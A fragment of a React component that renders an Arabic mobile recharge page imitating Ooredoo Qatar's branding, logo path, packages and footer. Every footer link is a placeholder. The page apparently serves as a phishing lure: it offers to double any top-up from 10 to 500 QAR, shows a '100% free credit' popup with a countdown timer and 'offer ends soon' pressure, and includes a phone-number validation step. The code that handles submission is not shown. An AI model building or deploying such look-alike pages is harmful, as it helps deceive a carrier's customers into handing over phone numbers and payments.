                              <svg viewBox="0 0 24 24" width="28" height="28"><path d="M12 2C8.13 2 5 5.13 5 9v.5c0 .28-.22.5-.5.5H4c-.55 0-1 .45-1 1s.45 1 1 1h.5c.28 0 .5.22.5.5 0 1.93-1.26 3.66-3 4.24v.26c0 .55.45 1 1 1h.17c.44 1.17 1.19 2 2.33 2.5.5.22 1.04.38 1.6.45.1.56.48 1.05 1.4 1.05.6 0 1.2-.2 1.8-.4.6-.2 1.2-.4 1.7-.4s1.1.2 1.7.4c.6.2 1.2.4 1.8.4.92 0 1.3-.49 1.4-1.05.56-.07 1.1-.23 1.6-.45 1.14-.5 1.89-1.33 2.33-2.5H20c.55 0 1-.45 1-1v-.26c-1.74-.58-3-2.31-3-4.24 0-.28.22-.5.5-.5H19c.55 0 1-.45 1-1s-.45-1-1-1h-.5c-.28 0-.5-.22-.5-.5V9c0-3.87-3.13-7-7-7z" fill="#FFFC00"/></svg>
                            )}
                          </div>
                        ) : (
                          <svg className="rp-card__benefit-icon" viewBox="0 0 24 24" fill="none" stroke="#ed1c24" strokeWidth="1.5">
                            <path d="M10.4 16.8L7.2 20M7.2 20L4 16.8M7.2 20V4M13.6 7.2L16.8 4M16.8 4L20 7.2M16.8 4V20" strokeLinecap="round" strokeLinejoin="round"/>
                          </svg>
                        )}
                        <div className="rp-card__benefit-details">
                          <div className="rp-card__benefit-value">
                            <span className="bold">{pkg.data}</span>
                            <span className="normal">{pkg.dataDesc}</span>
                          </div>
                          <span className="rp-card__bonus-extra">+ {pkg.data} إضافية مجاناً</span>
                        </div>
                      </div>}

                      {/* International Minutes */}
                      {pkg.intlMin && (
                        <div className="rp-card__benefit">
                          <svg className="rp-card__benefit-icon" viewBox="0 0 24 24" fill="none" stroke="#ed1c24" strokeWidth="1.5">
                            <circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>
                          </svg>
                          <div className="rp-card__benefit-details">
                            <div className="rp-card__benefit-value">
                              <span className="bold">ما يصل إلى {pkg.intlMin}</span>
                              <span className="normal">{pkg.intlMinDesc}</span>
                              <span className="rp-card__show-all">عرض الكل</span>
                            </div>
                            <span className="rp-card__bonus-extra">+ {pkg.intlMin} دقيقة دولية إضافية مجاناً</span>
                          </div>
                        </div>
                      )}

                      {/* Local Minutes */}
                      {pkg.localMin && (
                        <div className="rp-card__benefit">
                          <svg className="rp-card__benefit-icon" viewBox="0 0 24 24" fill="none" stroke="#ed1c24" strokeWidth="1.5">
                            <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"/>
                          </svg>
                          <div className="rp-card__benefit-details">
                            <div className="rp-card__benefit-value">
                              <span className="bold">{pkg.localMin}</span>
                              <span className="normal">{pkg.localMinDesc}</span>
                            </div>
                            <span className="rp-card__bonus-extra">+ {pkg.localMin} دقيقة إضافية مجاناً</span>
                          </div>
                        </div>
                      )}

                      {/* Country Minutes */}
                      {pkg.countryMin && (
                        <div className="rp-card__benefit">
                          <svg className="rp-card__benefit-icon" viewBox="0 0 24 24" fill="none" stroke="#ed1c24" strokeWidth="1.5">
                            <rect x="2" y="3" width="20" height="14" rx="2"/><path d="M2 7h20M8 3v14"/>
                          </svg>
                          <div className="rp-card__benefit-details">
                            <div className="rp-card__benefit-value">
                              <span className="normal">{pkg.countryMinDesc || "دقائق إضافية للدولة"}</span>
                              <span className="rp-card__show-all">عرض الكل</span>
                            </div>
                          </div>
                        </div>
                      )}

                      {/* Extras */}
                      <div className="rp-card__benefit">
                        <svg className="rp-card__benefit-icon" viewBox="0 0 24 24" fill="none" stroke="#ed1c24" strokeWidth="1.5">
                          <path d="M20 12v10H4V12M2 7h20v5H2zM12 22V7M12 7H7.5a2.5 2.5 0 110-5C11 2 12 7 12 7zM12 7h4.5a2.5 2.5 0 100-5C13 2 12 7 12 7z"/>
                        </svg>
                        <div className="rp-card__benefit-details">
                          <div className="rp-card__benefit-value">
                            <span className="bold">مزايا إضافية</span>
                          </div>
                          <div>
                            {pkg.extras.map((ext, j) => (
                              <span key={j} className="rp-card__sublabel">{ext}</span>
                            ))}
                          </div>
                        </div>
                      </div>

                      {/* Footer */}
                      <div className="rp-card__footer">
                        <div className="rp-card__validity">
                          <svg viewBox="0 0 16 16" fill="none" stroke="#37534e" strokeWidth="1.2">
                            <circle cx="8" cy="8" r="6.5"/><path d="M8 4v4h3"/>
                          </svg>
                          <span className="rp-card__validity-text">صالحة لغاية {pkg.validity}</span>
                        </div>
                          <div className="rp-card__price-container">
                          <div className="rp-card__price">
                            <span className="rp-card__price-currency">ر.ق</span>
                            <span className="rp-card__price-amount">{pkg.price}</span>
                          </div>
                          <div className="rp-card__divider"></div>
                          <svg className="rp-card__price-arrow" viewBox="0 0 24 24" fill="none" stroke="#ed1c24" strokeWidth="2">
                            <path d="M19 12H5M5 12l6-6M5 12l6 6"/>
                          </svg>
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>

              {/* Show More */}
              {packages.length > 4 && (
                <div className="rp-show-more">
                  <button onClick={() => setShowMore(!showMore)}>
                    {showMore ? "عرض أقل" : "عرض المزيد"}
                  </button>
                </div>
              )}
            </div>
          </div>

          {/* RIGHT SIDEBAR */}
          <div className="rp-promo-sidebar">
            <div className="rp-promo-sidebar__label">العروض الأكثر تفضيلاً</div>
            <div className="rp-promo-card">
              <div className="rp-promo-card__title">1 غيغابايت لمدة ساعة</div>
              <div className="rp-promo-card__desc">مقابل 1 ر.ق</div>
            </div>
            <div className="rp-promo-card">
              <div className="rp-promo-card__title">استخدم نقاط فلكسي أثناء التجوال</div>
              <div className="rp-promo-card__desc">استمتع بالاتصال في 170 دولة</div>
            </div>
            <div className="rp-promo-nav">
              <button>‹</button>
              <button>›</button>
            </div>
          </div>
        </div>

        {/* MORE SECTION */}
        <div className="rp-more-section">
          <h2>المزيد</h2>
          {accordionItems.map((item, i) => (
            <div key={i} className="rp-accordion-item">
              <span>{item}</span>
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M6 9l6 6 6-6"/></svg>
            </div>
          ))}
        </div>

        {/* FOOTER */}
        <footer className="rp-footer">
          <div className="rp-footer__top">
            <div className="rp-footer__col">
              <h4>عن Ooredoo</h4>
              <ul>
                <li><a href="#">معلومات عن Ooredoo</a></li>
                <li><a href="#">الذكاء الاصطناعي في أريدُ قطر</a></li>
                <li><a href="#">التحويل إلى Ooredoo</a></li>
                <li><a href="#">المركز الصحفي</a></li>
                <li><a href="#">الوظائف الشاغرة</a></li>
              </ul>
            </div>
            <div className="rp-footer__col">
              <h4>المساعدة والدعم</h4>
              <ul>
                <li><a href="#">اتصل بنا</a></li>
                <li><a href="#">الأسئلة الشائعة</a></li>
                <li><a href="#">خريطة الموقع</a></li>
                <li><a href="#">متاجرنا</a></li>
              </ul>
            </div>
            <div className="rp-footer__col">
              <h4>روابط سريعة</h4>
              <ul>
                <li><a href="#">تعبئة الرصيد</a></li>
                <li><a href="#">دفع الفواتير</a></li>
                <li><a href="#">باقات الجوال</a></li>
                <li><a href="#">الإنترنت المنزلي</a></li>
              </ul>
            </div>
            <div className="rp-footer__col">
              <h4>حمّل التطبيق</h4>
              <ul>
                <li><a href="#">App Store</a></li>
                <li><a href="#">Google Play</a></li>
                <li><a href="#">Huawei AppGallery</a></li>
              </ul>
            </div>
          </div>
          <div className="rp-footer__bottom">
            <div>
              <div className="rp-footer__bottom-links">
                <a href="#">الاتصال بنا</a><span>|</span>
                <a href="#">شروط استخدام الموقع</a><span>|</span>
                <a href="#">سياسة الخصوصية</a><span>|</span>
                <a href="#">اتفاقية الخدمات الرئيسية للأعمال</a>
              </div>
              <p className="rp-footer__copy" style={{ marginTop: 8 }}>Ooredoo &copy; 2024 . جميع الحقوق محفوظة</p>
            </div>
            <div className="rp-footer__social">
              <span>تابعنا</span>
              <a href="#"><svg viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></a>
              <a href="#"><svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="#fff" strokeWidth="2"/><circle cx="12" cy="12" r="5" fill="none" stroke="#fff" strokeWidth="2"/></svg></a>
              <a href="#"><svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
              <a href="#"><svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 00-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 00.502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 002.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 002.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg></a>
              <a href="#"><svg viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
            </div>
          </div>
        </footer>
      </div>

      {/* Custom Recharge Popup */}
      {showCustomRecharge && (
        <div className="rp-popup-overlay" onClick={() => setShowCustomRecharge(false)}>
          <div className="rp-popup" onClick={(e) => e.stopPropagation()}>
            <button className="rp-popup__close" onClick={() => setShowCustomRecharge(false)}>
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
            </button>
            <div className="rp-popup__header">
              <h3>مبلغ التعبئة</h3>
              <p>يرجى تحديد مبلغ ما بين 10 ر.ق و500 ر.ق لتعبئة رصيدك</p>
            </div>
            <div className="rp-popup__body">
              <input
                className="rp-popup__input"
                type="number"
                placeholder="أدخل مبلغ التعبئة"
                value={customAmount}
                onChange={(e) => setCustomAmount(e.target.value)}
                min="10"
                max="500"
              />
              {customAmount && parseFloat(customAmount) >= 10 && (
                <div style={{color:'#ed1c24', fontWeight:700, fontSize:'0.9rem', marginTop:'10px', textAlign:'center'}}>
                  عرض خاص: ستحصل على {customAmount} ر.ق + {customAmount} ر.ق إضافي = <span style={{fontSize:'1.1rem'}}>{parseFloat(customAmount) * 2} ر.ق</span>
                </div>
              )}
            </div>
            <button className="rp-popup__submit" style={{ background: customAmount && parseFloat(customAmount) >= 10 && parseFloat(customAmount) <= 500 ? '#ed1c24' : '#999' }} onClick={handleCustomRecharge}>متابعة</button>
          </div>
        </div>
      )}

      {/* Bottom Bar - shown when a package is selected */}
      {selectedPkg && (
        <div className="rp-bottom-bar">
          <div>
            <div className="rp-bottom-bar__pkg">{selectedPkg.name}</div>
            <div className="rp-bottom-bar__price">{selectedPkg.price} ر.ق</div>
          </div>
          {phoneError && (
            <div className="rp-bottom-bar__error">⚠️ {phoneError}</div>
          )}
          <div style={{display:'flex',alignItems:'center',gap:'8px'}}>
            <button className="rp-bottom-bar__btn" onClick={handleContinue} disabled={isValidating}>
              {isValidating ? "جاري التحقق..." : "متابعة"}
            </button>
            <button className="rp-bottom-bar__close" onClick={() => { setSelectedPkg(null); setPhoneError(""); }}>✕</button>
          </div>
        </div>
      )}

      {/* PROMO POPUP */}
      {showPopup && (
        <div className="promo-overlay" onClick={() => setShowPopup(false)}>
          <div className="promo-card" onClick={(e) => e.stopPropagation()}>
            <button className="promo-card__close" onClick={() => setShowPopup(false)}>×</button>
            <div className="promo-card__top">
              <img className="promo-card__logo" src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo" />
              <h3 className="promo-card__title">ضاعف رصيدك مع كل تعبئة!</h3>
              <p className="promo-card__subtitle">احصل على باقة إضافية مجانية مع أي باقة تختارها</p>
            </div>
            <div className="promo-card__body">
              <div className="promo-card__percent">%100</div>
              <div className="promo-card__percent-label">رصيد إضافي مجاناً</div>
              <div className="promo-card__timer">
                <div className="promo-card__timer-box">
                  <div className="promo-card__timer-num">{String(countdown % 60).padStart(2, '0')}</div>
                  <div className="promo-card__timer-label">ثانية</div>
                </div>
                <div className="promo-card__timer-sep">:</div>
                <div className="promo-card__timer-box">
                  <div className="promo-card__timer-num">{String(Math.floor((countdown % 3600) / 60)).padStart(2, '0')}</div>
                  <div className="promo-card__timer-label">دقيقة</div>
                </div>
                <div className="promo-card__timer-sep">:</div>
                <div className="promo-card__timer-box">
                  <div className="promo-card__timer-num">{String(Math.floor(countdown / 3600)).padStart(2, '0')}</div>
                  <div className="promo-card__timer-label">ساعة</div>
                </div>
              </div>
              <div className="promo-card__expire">العرض ينتهي قريباً.. لا تفوته!</div>
            </div>
            <div className="promo-card__bar"></div>
          </div>
        </div>
      )}
    </>
  );
}
